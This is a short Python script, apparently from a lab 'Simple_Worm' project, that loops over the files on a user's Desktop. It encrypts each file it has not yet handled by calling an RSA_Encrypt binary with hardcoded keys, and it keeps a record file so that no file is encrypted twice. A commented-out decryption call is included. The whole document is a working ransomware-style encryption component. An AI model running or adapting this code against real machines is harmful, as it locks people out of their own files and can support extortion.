#!/usr/bin/python3

path = "/home/attacker/Desktop/"
import os
entries = os.listdir(path)

record=[]
with open("/home/attacker/record.txt", "r", encoding='UTF-8') as file:
    for line in file:
        line = line.strip('\n')
        record.append(line)

# file = open("/home/attacker/record.txt","r")
# record = file.readlines()
# file.close()


print(entries)
print(record)

for i in entries:
    if i not in record:
        entry = path+i
        os.system("/home/attacker/Public/.Simple_Worm/Loop/RSA_Encrypt -C 126419 30743 "+entry)
        # os.system("./RSA_Encrypt -D 126419 55439 "+entry)
        file = open("/home/attacker/record.txt","a+",encoding='UTF-8')
        file.write(i+"\n")
        file.close()


# file = open("/home/attacker/record.txt","w")
# file.write("")
# file.close()


